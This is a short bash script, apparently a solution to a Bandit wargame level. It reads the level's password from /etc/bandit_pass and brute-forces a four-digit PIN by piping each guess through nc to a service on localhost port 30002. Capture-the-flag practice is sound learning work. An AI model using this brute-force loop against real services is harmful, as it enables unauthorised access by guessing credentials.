combo=$(echo {0..9}{0..9}{0..9}{0..9})
combos=($combo)
passw=$(cat /etc/bandit_pass/bandit24)
timeouti=2
for i in $(seq $1 $2); do
	attempt=$(echo -e $passw ${combos[$i]})
	result=$(echo $attempt | nc -q $timeouti localhost 30002)
	echo -e $attempt
	cleared=$(python clear.py $result)
	echo $cleared
	echo $cleared > outp.txt
done

